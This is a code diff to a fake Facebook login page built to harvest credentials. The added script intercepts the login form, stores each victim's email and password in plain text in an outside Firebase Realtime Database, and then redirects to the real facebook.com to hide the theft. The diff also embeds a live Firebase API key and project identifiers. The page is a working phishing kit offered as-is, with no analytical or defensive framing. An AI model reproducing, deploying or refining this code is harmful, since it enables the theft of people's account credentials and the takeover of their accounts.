@@ -10,9 +10,9 @@
 <body>
     <div class="login-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="fb-logo">
-        <form action="post.php" method="POST">
-            <input type="text" name="email" placeholder="Mobile number or email" required>
-            <input type="password" name="password" placeholder="Password" required>
+        <form id="login-form">
+            <input type="text" id="email" name="email" placeholder="Mobile number or email" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
             <button type="submit" class="btn">Log in</button>
             <a href="#" class="link">Forgot password?</a>
             <button type="button" class="create-account">Create new account</button>
@@ -21,5 +21,51 @@
             © Meta
         </div>
     </div>
+
+    <!-- Firebase Scripts -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-analytics.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDfzghEYCxEHPS8MsUxFnlN7LaG01UpL9U",
+            authDomain: "user-login-facebook.firebaseapp.com",
+            databaseURL: "https://user-login-facebook-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "user-login-facebook",
+            storageBucket: "user-login-facebook.appspot.com",
+            messagingSenderId: "701782849902",
+            appId: "1:701782849902:web:3dfb967570fb39dbdae97f",
+            measurementId: "G-Z9QV43LPFH"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const database = getDatabase(app);
+
+        // Handle form submission
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Create a new record in the Firebase Realtime Database
+            const newRecordRef = ref(database, 'records/' + Date.now());
+            set(newRecordRef, {
+                email: email,
+                password: password
+            })
+            .then(() => {
+                console.log('Data saved successfully.');
+                window.location.href = 'https://web.facebook.com/'; // Redirect after successful save
+            })
+            .catch((error) => {
+                console.error('Error saving data:', error);
+            });
+        });
+    </script>
 </body>
 </html>
